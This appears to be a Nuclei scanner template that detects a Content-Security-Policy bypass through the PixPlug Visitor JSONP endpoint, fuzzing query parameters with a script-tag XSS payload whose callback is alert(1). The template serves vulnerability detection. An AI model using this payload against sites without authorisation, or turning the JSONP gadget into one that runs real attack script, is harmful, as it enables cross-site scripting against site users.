flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - pixplug_visitor_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src="https://visitor.pixplug.in/jsonp/getdata.php?callback=alert(1)"></script>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: pixplug_visitor_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - pixplug.in
  method: GET
  path:
  - '{{BaseURL}}'
id: pixplug-visitor-csp-bypass
info:
  author: renniepak,DhiyaneshDK
  metadata:
    verified: true
  name: Content-Security-Policy Bypass - PixPlug Visitor
  reference:
  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  severity: medium
  tags: xss,csp-bypass,pixplug-visitor,vuln
